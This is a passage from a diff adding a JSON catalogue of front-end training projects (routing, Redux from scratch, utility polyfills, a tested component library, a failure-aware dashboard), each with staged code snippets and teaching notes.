+        "classes",
+        "prototypes",
+        "junior",
+        "types",
+        "hooks"
+      ]
+    },
+    {
+      "id": "basic-routed-app",
+      "kind": "project",
+      "tier": "basic",
+      "difficulty": "Junior",
+      "title": "A Real Multi-page SPA: Routes, Params and Guards",
+      "tagline": "Four screens, nested layouts, a protected route, and a URL you can actually share.",
+      "realWorldAnalog": "The shell of any dashboard product",
+      "architecturePattern": "Nested route tree with layout routes and a guard wrapper",
+      "essence": "Assemble the previous projects into one application behind a router: a list screen, a detail screen driven by a URL parameter, a form screen, and a protected area. The lesson is that the URL is state — if a filter or an open tab is not in the URL, a shared link does not reproduce the screen.",
+      "estimatedBuildTimeHours": 5,
+      "xp": 180,
+      "prerequisites": [
+        "basic-fetch-list",
+        "basic-controlled-form"
+      ],
+      "inScope": [
+        "Nested layout routes with a shared shell and an Outlet.",
+        "A dynamic :id route reading params, plus search params for filters.",
+        "A guarded route that redirects and returns the user to their target after login.",
+        "A 404 route and an error element."
+      ],
+      "outOfScope": [
+        "A real auth backend — a boolean in state is enough.",
+        "Server-side rendering or data loaders beyond one example.",
+        "Animated route transitions."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Routing with useState",
+          "focus": "A page variable and filters that vanish on reload",
+          "codeSnippet": "const [page, setPage] = useState('list');\nconst [filter, setFilter] = useState('all');\n\nreturn page === 'list' ? <List filter={filter} />\n     : page === 'detail' ? <Detail id={selectedId} />\n     : <NotFound />;",
+          "failureModeOrInvariant": "The back button leaves the app entirely. A link to a detail screen cannot be shared — it always opens the list. Reloading resets the filter. Every new screen adds another branch to the ternary chain.",
+          "architecturalLesson": "Navigation state that lives in a component is invisible to the browser. The address bar is the oldest state container on the platform."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "The URL as the state",
+          "focus": "Nested routes, params, search params, guarded redirect",
+          "codeSnippet": "<Route element={<AppShell />}>            {/* layout route */}\n  <Route path=\"items\" element={<List />} />\n  <Route path=\"items/:id\" element={<Detail />} />\n  <Route element={<RequireAuth />}>       {/* guard wraps children */}\n    <Route path=\"settings\" element={<Settings />} />\n  </Route>\n  <Route path=\"*\" element={<NotFound />} />\n</Route>\n\nconst { id } = useParams();\nconst [params, setParams] = useSearchParams();  // filter is shareable",
+          "failureModeOrInvariant": "Back and forward work. A pasted URL reproduces the exact screen including filters. The guard redirects to login and returns to the original destination afterwards rather than dumping the user on the home page.",
+          "architecturalLesson": "A route tree is composition: layout routes provide the shell, guard routes provide the policy, and leaf routes provide the screen. The same idea as children and wrapper components, expressed as a data structure."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Routing",
+          "components": [
+            "route tree",
+            "AppShell layout",
+            "RequireAuth guard",
+            "NotFound"
+          ],
+          "invariants": [
+            "Every navigable screen has a URL; no screen is reachable only by button."
+          ]
+        },
+        {
+          "layer": "Composition",
+          "components": [
+            "Outlet",
+            "compound Tabs component",
+            "children-based Card"
+          ],
+          "invariants": [
+            "Shell chrome is written once and shared by every route beneath it."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "Routing",
+          "topic": "React Router",
+          "subtopic": "Routes, params, nested layouts, navigation and guards",
+          "howCovered": "A ternary-based pseudo-router is replaced by a nested route tree with params, search params and a guard.",
+          "conceptIds": [
+            "router-core"
+          ]
+        },
+        {
+          "category": "React Advanced",
+          "topic": "Patterns",
+          "subtopic": "Composition: children, render props, compound components",
+          "howCovered": "The shell uses Outlet, and one screen is built as a compound Tabs component sharing implicit state.",
+          "conceptIds": [
+            "react-composition"
+          ]
+        },
+        {
+          "category": "HTML",
+          "topic": "Structure",
+          "subtopic": "Landmarks and document outline across pages",
+          "howCovered": "The shell provides nav, main and header landmarks, and the document title updates per route.",
+          "conceptIds": [
+            "html-semantics",
+            "a11y-core"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "The History API",
+          "mechanism": "pushState and popstate let a single document change its URL without a network navigation.",
+          "realWorldImpact": "Explains what a client-side router actually is, and why the server needs a catch-all rewrite.",
+          "conceptIds": [
+            "router-core",
+            "web-how-page-loads"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "History integration and route matching",
+          "Outlet rendering"
+        ],
+        "manualEngineeringRequired": [
+          "Deciding which state belongs in the URL and which does not.",
+          "The redirect-and-return-to-target guard behaviour."
+        ]
+      },
+      "conceptIds": [
+        "router-core",
+        "react-composition",
+        "html-semantics",
+        "a11y-core"
+      ],
+      "tags": [
+        "react",
+        "routing",
+        "composition",
+        "spa",
+        "junior",
+        "state",
+        "forms"
+      ]
+    },
+    {
+      "id": "inter-flux-to-rtk",
+      "kind": "project",
+      "tier": "intermediate",
+      "difficulty": "Intermediate",
+      "title": "Write Redux Yourself, Then Delete It",
+      "tagline": "Forty lines of createStore, then the same app on Redux Toolkit — and you can defend both.",
+      "realWorldAnalog": "The state layer of any enterprise React application",
+      "architecturePattern": "Unidirectional data flow: dispatcher → store → view",
+      "essence": "Implement a working store — subscribe, dispatch, getState, a reducer, and a middleware chain — in about forty lines, then rebuild the same feature on Redux Toolkit. Mettl bills Redux at parity with React itself on its React assessment, and Flux appears by name on the ReactJS paper; almost no 2026 preparation material covers either.",
+      "estimatedBuildTimeHours": 8,
+      "xp": 320,
+      "prerequisites": [
+        "basic-routed-app"
+      ],
+      "inScope": [
+        "createStore with getState, dispatch, subscribe and replaceReducer.",
+        "combineReducers and one applyMiddleware chain including a logger and a thunk.",
+        "The same feature ported to configureStore and createSlice.",
+        "One memoised selector, and a demonstration of what it stops re-rendering."
+      ],
+      "outOfScope": [
+        "Redux Saga or Observable.",
+        "A normalised entity cache beyond one small example.",
+        "Server state — that belongs to TanStack Query, and the project says why."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Flux, as originally described",
+          "focus": "Dispatcher, multiple stores, emitted change events",
+          "codeSnippet": "// Flux: many stores, one dispatcher, no return value\nDispatcher.register(payload => {\n  switch (payload.type) {\n    case 'ADD_TODO':\n      _todos.push(payload.todo);      // stores mutate their own data\n      TodoStore.emitChange();          // views listen for 'change'\n  }\n});",
+          "failureModeOrInvariant": "Stores mutate private arrays and emit an untyped change event, so a view knows something changed but not what. Cross-store dependencies need waitFor with explicit dispatch tokens, and the order becomes load-bearing.",
+          "architecturalLesson": "Flux got the direction right — one way, always — and the storage wrong. Redux keeps the direction and replaces N mutable stores with one immutable tree."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "createStore in forty lines",
+          "focus": "Pure reducers, subscription, middleware as function composition",
+          "codeSnippet": "function createStore(reducer, preloaded) {\n  let state = preloaded, listeners = [];\n  const getState = () => state;\n  const dispatch = (action) => {\n    state = reducer(state, action);       // pure: same in, same out\n    listeners.forEach(l => l());\n    return action;\n  };\n  const subscribe = (l) => { listeners.push(l);\n    return () => { listeners = listeners.filter(x => x !== l); }; };\n  dispatch({ type: '@@INIT' });\n  return { getState, dispatch, subscribe };\n}\n\n// middleware is currying, nothing more\nconst logger = store => next => action => { console.log(action); return next(action); };",
+          "failureModeOrInvariant": "A reducer that mutates state or reads Date.now() breaks time-travel debugging and makes tests flaky. A subscriber that dispatches during notification recurses.",
+          "architecturalLesson": "The three Redux rules — single source of truth, read-only state, changes via pure functions — are what make the devtools, replay and undo possible. They are constraints that buy capabilities."
+        },
+        {
+          "stageNumber": 3,
+          "stageName": "Redux Toolkit, understood rather than copied",
+          "focus": "createSlice, Immer drafts, thunks, memoised selectors",
+          "codeSnippet": "const todos = createSlice({\n  name: 'todos',\n  initialState: [],\n  reducers: {\n    added(state, action) { state.push(action.payload); },  // Immer draft, still immutable\n  },\n});\n\nconst selectVisible = createSelector(\n  [s => s.todos, s => s.filter],\n  (todos, filter) => todos.filter(t => match(t, filter)),   // recomputes only on input change\n);",
+          "failureModeOrInvariant": "state.push looks like mutation and is not — Immer records the draft operations and produces a new tree. A selector returning a fresh array literal each call re-renders every subscriber; createSelector is what stops it.",
+          "architecturalLesson": "RTK removes boilerplate, not concepts. You still have to know that the reducer is pure, or the draft syntax will mislead you in code review."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Domain",
+          "components": [
+            "action types",
+            "pure reducers",
+            "selectors"
+          ],
+          "invariants": [
+            "A reducer is a pure function of (state, action) with no I/O."
+          ]
+        },
+        {
+          "layer": "Application",
+          "components": [
+            "store",
+            "middleware chain",
+            "thunks"
+          ],
+          "invariants": [
+            "All side effects live in middleware, never in a reducer."
+          ]
+        },
+        {
+          "layer": "View",
+          "components": [
+            "useSelector",
+            "useDispatch",
+            "memoised list rows"
+          ],
+          "invariants": [
+            "A component subscribes to the narrowest slice it can."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "State Management",
+          "topic": "Redux",
+          "subtopic": "Store, actions, reducers, pure functions, data flow",
+          "howCovered": "createStore is implemented from scratch, so every one of the five terms is code you wrote.",
+          "conceptIds": [
+            "redux-core"
+          ]
+        },
+        {
+          "category": "State Management",
+          "topic": "Redux",
+          "subtopic": "react-redux, middleware, thunks and Redux Toolkit",
+          "howCovered": "The hand-built store is replaced by configureStore and createSlice with the same feature behaviour.",
+          "conceptIds": [
+            "redux-react-toolkit"
+          ]
+        },
+        {
+          "category": "Tooling",
+          "topic": "Architecture history",
+          "subtopic": "Flux — and why Mettl still asks about it",
+          "howCovered": "The original dispatcher-and-stores design is built first, so the Redux comparison is first-hand.",
+          "conceptIds": [
+            "tooling-flux"
+          ]
+        },
+        {
+          "category": "State Management",
+          "topic": "Choosing",
+          "subtopic": "Context, Zustand, TanStack Query — picking the tool",
+          "howCovered": "Ends with an explicit written argument for which of the four this feature should have used.",
+          "conceptIds": [
+            "state-alternatives"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Language Semantics",
+          "title": "Closures as private state",
+          "mechanism": "createStore keeps state and listeners in closure scope rather than on an object.",
+          "realWorldImpact": "The store is unreachable except through its three methods — encapsulation without classes.",
+          "conceptIds": [
+            "js-scope-closures"
+          ]
+        },
+        {
+          "domain": "Language Semantics",
+          "title": "Structural sharing",
+          "mechanism": "Immutable updates copy only the path to the change, leaving siblings referentially equal.",
+          "realWorldImpact": "Makes shallow reference comparison a sufficient re-render check for a large tree.",
+          "conceptIds": [
+            "react-immutability",
+            "react-references-copying"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "Immer draft tracking in RTK",
+          "react-redux subscription plumbing"
+        ],
+        "manualEngineeringRequired": [
+          "The store, the middleware chain and the selector memoisation, written before importing any of them.",
+          "The written justification for the final choice of tool."
+        ]
+      },
+      "conceptIds": [
+        "redux-core",
+        "redux-react-toolkit",
+        "tooling-flux",
+        "state-alternatives"
+      ],
+      "tags": [
+        "redux",
+        "flux",
+        "state",
+        "middleware",
+        "intermediate"
+      ]
+    },
+    {
+      "id": "inter-utility-belt",
+      "kind": "project",
+      "tier": "intermediate",
+      "difficulty": "Intermediate",
+      "title": "The Utility Belt: Implement Lodash, Badly, Then Correctly",
+      "tagline": "debounce, throttle, curry, deepClone, Promise.all, and a bind that handles `new`.",
+      "realWorldAnalog": "The 45-minute machine-coding round",
+      "architecturePattern": "A published-shaped module with tests for the edge cases",
+      "essence": "Implement the functions interviewers ask you to implement live: debounce with leading and trailing options, throttle, curry, deep clone with cycles, a bind that survives `new`, and Promise.all/allSettled/race from scratch. Each one is a closure, a `this` rule or a microtask rule that you can then explain rather than recall.",
+      "estimatedBuildTimeHours": 7,
+      "xp": 300,
+      "prerequisites": [
+        "basic-dom-todo",
+        "basic-equality-lab"
+      ],
+      "inScope": [
+        "debounce (leading/trailing/maxWait) and throttle, with cancel and flush.",
+        "curry supporting placeholders and variadic arity.",
+        "deepClone handling cycles, Map, Set, Date and RegExp.",
+        "myBind, myCall, myApply — including the `new` case — and Promise combinators."
+      ],
+      "outOfScope": [
+        "A full lodash surface.",
+        "Publishing to npm.",
+        "A build pipeline; one ESM module with tests is the deliverable."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "The version that passes the demo",
+          "focus": "Naive implementations that break on the second question",
+          "codeSnippet": "function debounce(fn, ms) {\n  let t;\n  return function () {\n    clearTimeout(t);\n    t = setTimeout(fn, ms);      // loses 'this' and the arguments\n  };\n}\n\nfunction deepClone(o) {\n  return JSON.parse(JSON.stringify(o)); // drops undefined, Dates become strings,\n}                                       // functions vanish, cycles throw",
+          "failureModeOrInvariant": "debounce drops the receiver and every argument, so a debounced method call fails. The JSON clone silently corrupts Dates, undefined, Map, Set and NaN, and throws outright on a cycle.",
+          "architecturalLesson": "These are the follow-up questions, not gotchas. The interviewer asks \"what about `this`?\" because that is where the understanding is."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "Correct under the follow-ups",
+          "focus": "Preserved receiver and arguments, cycle-safe cloning, spec-shaped combinators",
+          "codeSnippet": "function debounce(fn, ms, { leading = false, trailing = true } = {}) {\n  let t, lastArgs, lastThis;\n  const invoke = () => { fn.apply(lastThis, lastArgs); };\n  const debounced = function (...args) {\n    lastArgs = args; lastThis = this;          // receiver preserved\n    if (leading && !t) invoke();\n    clearTimeout(t);\n    t = setTimeout(() => { t = null; if (trailing) invoke(); }, ms);\n  };\n  debounced.cancel = () => { clearTimeout(t); t = null; };\n  return debounced;\n}\n\nconst deepClone = (v, seen = new WeakMap()) => { /* cycles via seen */ };",
+          "failureModeOrInvariant": "The debounced function forwards `this` and every argument, supports cancel, and does not fire a trailing call after cancel. deepClone terminates on a self-referencing object because a WeakMap remembers what it has already copied.",
+          "architecturalLesson": "A WeakMap is the right cycle registry precisely because it does not retain its keys — the clone does not leak the source graph."
+        },
+        {
+          "stageNumber": 3,
+          "stageName": "Promise combinators from the algorithm",
+          "focus": "all, allSettled, race, any — and why ordering is preserved",
+          "codeSnippet": "function all(iterable) {\n  return new Promise((resolve, reject) => {\n    const out = []; let pending = 0, i = 0;\n    for (const p of iterable) {\n      const idx = i++; pending++;\n      Promise.resolve(p).then(v => {\n        out[idx] = v;                 // index, not push — order preserved\n        if (--pending === 0) resolve(out);\n      }, reject);                     // first rejection wins\n    }\n    if (i === 0) resolve([]);         // empty iterable resolves immediately\n  });\n}",
+          "failureModeOrInvariant": "Using push instead of an index returns results in completion order, which is the single most common bug in this exercise. Forgetting the empty-iterable case leaves the promise pending forever.",
+          "architecturalLesson": "Writing the combinator makes the microtask queue concrete: every .then callback is a microtask, and they drain before the next timer fires."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Timing",
+          "components": [
+            "debounce",
+            "throttle",
+            "rate limiter"
+          ],
+          "invariants": [
+            "Every timing utility exposes cancel; none leaks a pending timer."
+          ]
+        },
+        {
+          "layer": "Functional",
+          "components": [
+            "curry",
+            "compose",
+            "myBind/myCall/myApply"
+          ],
+          "invariants": [
+            "Receiver and arity are preserved through every wrapper."
+          ]
+        },
+        {
+          "layer": "Async",
+          "components": [
+            "all",
+            "allSettled",
+            "race",
+            "any",
+            "promisify"
+          ],
+          "invariants": [
+            "Result order matches input order regardless of settle order."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "JavaScript",
+          "topic": "Machine coding",
+          "subtopic": "Polyfills, debounce, throttle, curry, deep clone",
+          "howCovered": "Each utility is written naively, broken by a follow-up question, then rewritten correctly.",
+          "conceptIds": [
+            "js-polyfills"
+          ]
+        },
+        {
+          "category": "JavaScript",
+          "topic": "Execution",
+          "subtopic": "`this`, call/apply/bind and arrow functions",
+          "howCovered": "myBind is implemented including the `new` case, which forces the receiver rules into the open.",
+          "conceptIds": [
+            "js-this"
+          ]
+        },
+        {
+          "category": "JavaScript",
+          "topic": "Async",
+          "subtopic": "Promises, combinators and the microtask queue",
+          "howCovered": "All four combinators are implemented from the specification algorithm rather than recalled.",
+          "conceptIds": [
+            "js-promises",
+            "js-event-loop"
+          ]
+        },
+        {
+          "category": "JavaScript",
+          "topic": "Data",
+          "subtopic": "References, shallow copies and deep cloning",
+          "howCovered": "deepClone is built to survive cycles, Maps, Sets and Dates, then compared against structuredClone.",
+          "conceptIds": [
+            "react-references-copying",
+            "js-arrays-objects"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "V8 Engine & Memory",
+          "title": "Weak references",
+          "mechanism": "WeakMap keys do not prevent collection, unlike Map keys.",
+          "realWorldImpact": "A Map-based clone registry keeps the entire source graph alive for the process lifetime.",
+          "conceptIds": [
+            "js-arrays-objects"
+          ]
+        },
+        {
+          "domain": "Tooling & Build",
+          "title": "Module boundaries",
+          "mechanism": "Named ESM exports are statically analysable and therefore tree-shakeable.",
+          "realWorldImpact": "Explains why lodash-es shrinks a bundle where lodash does not.",
+          "conceptIds": [
+            "js-modules",
+            "tooling-bundlers"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [],
+        "manualEngineeringRequired": [
+          "Every utility, plus a test for each edge case the follow-up question would raise."
+        ]
+      },
+      "conceptIds": [
+        "js-polyfills",
+        "js-this",
+        "js-promises",
+        "js-event-loop",
+        "react-references-copying",
+        "js-arrays-objects"
+      ],
+      "tags": [
+        "javascript",
+        "machine coding",
+        "closures",
+        "promises",
+        "intermediate",
+        "async"
+      ]
+    },
+    {
+      "id": "inter-tested-library",
+      "kind": "project",
+      "tier": "intermediate",
+      "difficulty": "Intermediate",
+      "title": "A Component Library You Can Defend in Review",
+      "tagline": "Six components, generic props, tests that survive a refactor, and a keyboard that works.",
+      "realWorldAnalog": "The internal design-system package at any mid-size company",
+      "architecturePattern": "Headless behaviour hooks + presentational components",
+      "essence": "Build Button, Dialog, Combobox, Tabs, Toast and DataList as a properly typed package with tests. The discriminating skill is not writing them — it is writing tests that fail when the behaviour breaks and pass when the markup is refactored, and typing a polymorphic component without reaching for any.",
+      "estimatedBuildTimeHours": 9,
+      "xp": 340,
+      "prerequisites": [
+        "basic-routed-app"
+      ],
+      "inScope": [
+        "Six components split into a behaviour hook and a presentational shell.",
+        "Generic and polymorphic props typed without any, including an `as` prop.",
+        "Tests written against role and accessible name, never against class names.",
+        "Full keyboard support per the WAI-ARIA authoring practices for each pattern."
+      ],
+      "outOfScope": [
+        "Theming systems and token pipelines.",
+        "Storybook, visual regression, or a docs site.",
+        "Publishing and semantic-release automation."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Components that pass their own tests",
+          "focus": "any-typed props and tests bound to implementation details",
+          "codeSnippet": "type Props = { as?: any; onSelect?: (v: any) => void; [k: string]: any };\n\ntest('opens', () => {\n  const { container } = render(<Dialog />);\n  fireEvent.click(container.querySelector('.btn-primary'));   // class name\n  expect(container.querySelector('.dialog-open')).toBeTruthy();\n});",
+          "failureModeOrInvariant": "Renaming .btn-primary breaks a test that has nothing to do with the change, so the suite gets ignored. Meanwhile the dialog is a div with no role, no focus trap and no Escape handler — and every test passes.",
+          "architecturalLesson": "A test coupled to markup measures the markup. A test coupled to role and accessible name measures what a user — and a screen reader — can actually do."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "Behaviour extracted, contracts typed",
+          "focus": "Headless hooks, discriminated props, role-based queries",
+          "codeSnippet": "type ButtonProps<T extends ElementType = 'button'> = {\n  as?: T; variant: 'primary' | 'ghost';\n} & Omit<ComponentPropsWithoutRef<T>, 'as' | 'variant'>;\n\n// behaviour lives in a hook; markup is replaceable\nconst { triggerProps, panelProps } = useDisclosure();\n\ntest('dialog traps focus and closes on Escape', async () => {\n  render(<Dialog />);\n  await user.click(screen.getByRole('button', { name: /settings/i }));\n  expect(screen.getByRole('dialog')).toHaveFocus();\n  await user.keyboard('{Escape}');\n  expect(screen.queryByRole('dialog')).not.toBeInTheDocument();\n});",
+          "failureModeOrInvariant": "The test now fails if focus is not moved into the dialog or Escape stops working, and survives a full CSS rewrite. Polymorphic props are inferred, so <Button as=\"a\" href=...> type-checks and <Button as=\"a\" type=\"submit\"> does not.",
+          "architecturalLesson": "Separating behaviour from presentation is what makes both testable in isolation — and it is the same reason headless libraries exist."
+        },
+        {
+          "stageNumber": 3,
+          "stageName": "The boundaries",
+          "focus": "Mocking the network, not the module under test",
+          "codeSnippet": "// Mock the transport, not your own code\nconst server = setupServer(\n  http.get('/api/items', () => HttpResponse.json([{ id: 1 }])),\n);\n\ntest('shows empty state', async () => {\n  server.use(http.get('/api/items', () => HttpResponse.json([])));\n  render(<DataList />);\n  expect(await screen.findByText(/nothing here/i)).toBeInTheDocument();\n});",
+          "failureModeOrInvariant": "Mocking the component’s own fetch wrapper makes the test pass even when the real request shape is wrong. Intercepting at the network boundary tests the code that will actually run in production.",
+          "architecturalLesson": "Mock at a boundary you do not own. Everything inside the boundary should be exercised for real, or the test is checking your mock."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Behaviour",
+          "components": [
+            "useDisclosure",
+            "useRovingFocus",
+            "useCombobox",
+            "useToastQueue"
+          ],
+          "invariants": [
+            "No hook renders DOM; each returns prop getters."
+          ]
+        },
+        {
+          "layer": "Presentation",
+          "components": [
+            "Button",
+            "Dialog",
+            "Combobox",
+            "Tabs",
+            "Toast",
+            "DataList"
+          ],
+          "invariants": [
+            "Every interactive element is reachable and operable by keyboard alone."
+          ]
+        },
+        {
+          "layer": "Contracts",
+          "components": [
+            "polymorphic prop types",
+            "discriminated variant unions"
+          ],
+          "invariants": [
+            "No `any` in any exported type."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "Testing",
+          "topic": "Practice",
+          "subtopic": "Testing Library, what to test, mocking and end-to-end",
+          "howCovered": "Class-name tests are rewritten as role-and-name tests, and the network is mocked at the boundary with MSW.",
+          "conceptIds": [
+            "testing-react"
+          ]
+        },
+        {
+          "category": "TypeScript",
+          "topic": "Types",
+          "subtopic": "Narrowing, generics and typing React props",
+          "howCovered": "A polymorphic `as` prop is typed with generics and ComponentPropsWithoutRef, with no escape to any.",
+          "conceptIds": [
+            "ts-essentials"
+          ]
+        },
+        {
+          "category": "Accessibility",
+          "topic": "Foundations",
+          "subtopic": "ARIA, keyboard navigation and focus management",
+          "howCovered": "Each component implements its WAI-ARIA authoring-practices keyboard contract, asserted in tests.",
+          "conceptIds": [
+            "a11y-core"
+          ]
+        },
+        {
+          "category": "React Advanced",
+          "topic": "Patterns",
+          "subtopic": "Compound components, render props and prop getters",
+          "howCovered": "Tabs and Combobox are compound components sharing implicit state through context.",
+          "conceptIds": [
+            "react-composition",
+            "react-hooks-rest"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "The accessibility tree",
+          "mechanism": "Roles and accessible names are computed from markup and ARIA into a parallel tree.",
+          "realWorldImpact": "Querying by role in tests is querying the same structure assistive technology uses.",
+          "conceptIds": [
+            "a11y-core",
+            "html-semantics"
+          ]
+        },
+        {
+          "domain": "Tooling & Build",
+          "title": "Type erasure",
+          "mechanism": "TypeScript types vanish at runtime; only the emitted JavaScript executes.",
+          "realWorldImpact": "Explains why external input still needs runtime validation despite a typed signature.",
+          "conceptIds": [
+            "ts-essentials"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "Testing Library queries",
+          "MSW request interception"
+        ],
+        "manualEngineeringRequired": [
+          "Every keyboard interaction contract.",
+          "Polymorphic prop typing without any."
+        ]
+      },
+      "conceptIds": [
+        "testing-react",
+        "ts-essentials",
+        "a11y-core",
+        "react-composition",
+        "react-hooks-rest"
+      ],
+      "tags": [
+        "typescript",
+        "testing",
+        "accessibility",
+        "composition",
+        "intermediate"
+      ]
+    },
+    {
+      "id": "inter-designed-dashboard",
+      "kind": "project",
+      "tier": "intermediate",
+      "difficulty": "Senior",
+      "title": "Design It On The Whiteboard, Then Actually Build It",
+      "tagline": "A dashboard specified as a design document first — components, data, states, failure.",
+      "realWorldAnalog": "The front-end system design round at any 2-5 YOE interview",
+      "architecturePattern": "Server-state / client-state separation with an explicit failure policy",
+      "essence": "Write the design document first — component boundaries, data flow, every state, and what happens when each dependency fails — then build exactly what the document specifies. The round is graded on whether you volunteered the failure modes, and this is the only way to practise that rather than read about it.",
+      "estimatedBuildTimeHours": 10,
+      "xp": 380,
+      "prerequisites": [
+        "inter-flux-to-rtk",
+        "basic-fetch-list"
+      ],
+      "inScope": [
+        "A written design doc: component tree, data ownership, state inventory, failure table.",
+        "Server state in a query cache; client state kept separate and small.",
+        "Offline-tolerant reads from IndexedDB with an explicit staleness indicator.",
+        "A degraded mode: one widget fails without taking the page down."
+      ],
+      "outOfScope": [
+        "Real-time collaboration.",
+        "A charting library beyond one chart.",
+        "Authentication infrastructure."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Build first, design never",
+          "focus": "One global store holding everything, no failure policy",
+          "codeSnippet": "// Everything in one store: server data, UI flags, form drafts\nconst store = { widgets: [], loading: false, error: null,\n                sidebarOpen: true, draft: {}, user: null };\n\n// One failure takes the page\nconst [a, b, c] = await Promise.all([getKpis(), getFeed(), getAlerts()]);",
+          "failureModeOrInvariant": "Promise.all means one slow or failing endpoint blanks the whole dashboard. Server data and UI flags share a store, so a refetch invalidates the sidebar state. Nobody can say what the screen shows when the feed is empty but the KPIs loaded.",
+          "architecturalLesson": "Server state and client state have different lifetimes, different invalidation rules and different owners. Merging them makes both harder."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "The document, then the code",
+          "focus": "State inventory, per-widget boundaries, an explicit failure table",
+          "codeSnippet": "// Failure table — written before any component\n// Dependency   | Failure       | Behaviour              | Recovery\n// KPI API      | 5xx           | last cached + stale tag| retry x3, backoff\n// Feed API     | timeout       | skeleton -> empty note | manual retry\n// Alerts WS    | disconnect    | banner, poll fallback  | reconnect w/ jitter\n\n<ErrorBoundary fallback={<WidgetDown name=\"Feed\" />}>\n  <Suspense fallback={<WidgetSkeleton />}><Feed /></Suspense>\n</ErrorBoundary>",
+          "failureModeOrInvariant": "Each widget owns its own request, boundary and skeleton, so a failing feed shows one degraded card rather than a blank page. Every cell of the failure table corresponds to code that exists.",
+          "architecturalLesson": "The failure table is the deliverable interviewers actually want. Producing it unprompted is the difference between a mid-level and a senior answer."
+        },
+        {
+          "stageNumber": 3,
+          "stageName": "Caching with a stated policy",
+          "focus": "Stale-while-revalidate, IndexedDB persistence, cache invalidation rules",
+          "codeSnippet": "// Every cached key has a written policy, not a default\n// kpis:      staleTime 30s,  gcTime 5m,  persist: yes\n// feed:      staleTime 0,    gcTime 1m,  persist: no\n// profile:   staleTime 1h,   gcTime 24h, persist: yes\n\nawait idb.set('kpis', { data, fetchedAt: Date.now() });\nconst isStale = Date.now() - fetchedAt > 30_000;   // shown in the UI, not hidden",
+          "failureModeOrInvariant": "A user opening the dashboard offline sees yesterday’s numbers clearly labelled as stale, rather than either a spinner forever or stale numbers presented as current.",
+          "architecturalLesson": "Showing cached data is a product decision as much as a technical one. The honest version tells the user how old the number is."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Design",
+          "components": [
+            "component tree diagram",
+            "state inventory",
+            "failure table",
+            "cache policy table"
+          ],
+          "invariants": [
+            "No component is written before its row exists in the state inventory."
+          ]
+        },
+        {
+          "layer": "Data",
+          "components": [
+            "query cache",
+            "IndexedDB persister",
+            "retry with backoff"
+          ],
+          "invariants": [
+            "Server state never lives in the client store, and vice versa."
+          ]
+        },
+        {
+          "layer": "View",
+          "components": [
+            "per-widget error boundary",
+            "skeletons",
+            "stale badge",
+            "offline banner"
+          ],
+          "invariants": [
+            "A single widget failure never blanks the page."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "Architecture",
+          "topic": "System design",
+          "subtopic": "Components, data, states, failure",
+          "howCovered": "The design document is the first deliverable and the build is graded against it.",
+          "conceptIds": [
+            "frontend-system-design"
+          ]
+        },
+        {
+          "category": "Web Platform",
+          "topic": "Storage",
+          "subtopic": "Cookies, localStorage, sessionStorage, IndexedDB",
+          "howCovered": "Cached responses are persisted to IndexedDB, with an argued reason for not using localStorage.",
+          "conceptIds": [
+            "web-storage"
+          ]
+        },
+        {
+          "category": "Web Platform",
+          "topic": "Network",
+          "subtopic": "Status codes, idempotency and retry policy",
+          "howCovered": "The retry policy distinguishes idempotent from non-idempotent requests and 4xx from 5xx.",
+          "conceptIds": [
+            "web-http"
+          ]
+        },
+        {
+          "category": "State Management",
+          "topic": "Choosing",
+          "subtopic": "Context, Zustand, TanStack Query — the right tool",
+          "howCovered": "Server and client state are deliberately given different tools, with the split written down.",
+          "conceptIds": [
+            "state-alternatives"
+          ]
+        },
+        {
+          "category": "React Advanced",
+          "topic": "Escape hatches",
+          "subtopic": "Error boundaries and Suspense",
+          "howCovered": "Each widget is independently wrapped so failures are contained to one card.",
+          "conceptIds": [
+            "react-errors-portals"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Internet & Protocols",
+          "title": "Caching semantics",
+          "mechanism": "Cache-Control, ETag and conditional requests define freshness at the HTTP layer too.",
+          "realWorldImpact": "An application cache that ignores the transport cache does the same work twice.",
+          "conceptIds": [
+            "web-http"
+          ]
+        },
+        {
+          "domain": "Security & Invariants",
+          "title": "What may be persisted",
+          "mechanism": "Anything in IndexedDB or localStorage is readable by script on that origin.",
+          "realWorldImpact": "Rules out persisting tokens, and explains the httpOnly cookie recommendation.",
+          "conceptIds": [
+            "web-security",
+            "web-storage"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "Query caching and revalidation",
+          "Suspense and boundary mechanics"
+        ],
+        "manualEngineeringRequired": [
+          "The design document, the failure table and the cache policy — all written before code.",
+          "The offline persistence layer and staleness surfacing."
+        ]
+      },
+      "conceptIds": [
+        "frontend-system-design",
+        "web-storage",
+        "web-http",
+        "state-alternatives",
